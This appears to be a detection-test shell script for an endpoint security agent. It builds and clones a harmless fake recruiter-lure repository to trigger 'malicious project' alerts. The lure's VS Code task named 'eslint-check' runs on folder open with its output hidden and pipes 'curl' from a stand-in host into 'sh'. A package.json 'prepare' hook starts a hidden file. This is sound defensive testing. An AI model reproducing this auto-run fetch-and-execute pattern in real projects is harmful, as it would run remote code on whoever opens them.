#!/bin/sh
# Harmless fake "coding test" repository, to check that an endpoint's agent
# scans a project when it is cloned (agent/internal/projscan,
# docs/operations/ioa.md). Run as a normal user on a Linux endpoint with git:
#
#     sh tests/simulations/project_scan_sim.sh
#
# What it does, and nothing else:
#   1. builds a local git repository shaped like the fake-recruiter lures:
#      a .vscode/tasks.json that would run on folder open with its output
#      hidden, and a package.json "prepare" script starting a hidden file.
#      Their commands point at example.invalid, which never resolves, and
#      nothing here runs them;
#   2. git clones it into a temporary folder: the clone is what the agent
#      reacts to;
#   3. waits for the scan, then removes everything it created.
#
# Expected within a minute: a desktop pop-up "A project you just downloaded
# looks malicious" (if pop-ups are on for the group), the alerts "Malicious-
# Looking Project Downloaded (high)" and "(medium)", and a project_scan
# summary line with verdict=suspicious in Logs.
#
# Do NOT open the cloned folder in VS Code while it exists: the task would try
# to run (it fails: example.invalid doesn't resolve).
set -eu

command -v git >/dev/null || { echo "git is required" >&2; exit 1; }
work=$(mktemp -d "${TMPDIR:-/tmp}/adsiem-projscan-sim.XXXXXX")
trap 'rm -rf "$work"' EXIT
src="$work/lure-src"
mkdir -p "$src/.vscode"

cat > "$src/package.json" <<'JSON'
{
  "name": "crypto-dashboard-test",
  "version": "1.0.0",
  "scripts": {
    "start": "node server.js",
    "prepare": "node .vscode/settings.js"
  }
}
JSON
cat > "$src/.vscode/tasks.json" <<'JSON'
{
  // ADSIEM simulation: harmless, example.invalid never resolves
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "linux": { "command": "curl -s https://example.invalid/adsiem-sim | sh" },
      "osx": { "command": "curl -s https://example.invalid/adsiem-sim | sh" },
      "windows": { "command": "curl https://example.invalid/adsiem-sim" },
      "presentation": { "reveal": "never", "echo": false },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
JSON
echo "console.log('adsiem simulation: nothing to see')" > "$src/.vscode/settings.js"
echo "require('http').createServer((q, r) => r.end('ok')).listen(3000)" > "$src/server.js"

export GIT_AUTHOR_NAME=adsiem-sim GIT_AUTHOR_EMAIL=sim@example.invalid
export GIT_COMMITTER_NAME=adsiem-sim GIT_COMMITTER_EMAIL=sim@example.invalid
git -C "$src" init -q
git -C "$src" add .
git -C "$src" commit -qm "coding test"

cd "$work"
echo "cloning the lure into $work/crypto-dashboard-test ..."
git clone -q "$src" crypto-dashboard-test
echo "waiting 20 s for the agent's scan ..."
sleep 20
echo "done; check the alerts and Logs (log type project_scan). Cleaning up."
